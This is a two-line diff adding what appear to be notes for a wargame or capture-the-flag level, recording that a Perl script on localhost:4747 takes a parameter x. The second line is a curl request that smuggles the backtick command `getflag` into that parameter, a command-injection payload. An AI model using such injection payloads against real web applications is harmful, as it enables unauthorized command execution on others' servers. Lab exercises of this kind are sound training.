@@ -1,0 +1,2 @@
+cat level04 -> localhost:4747, parameter x
+curl localhost:4747/level04.pl?x='`getflag`'
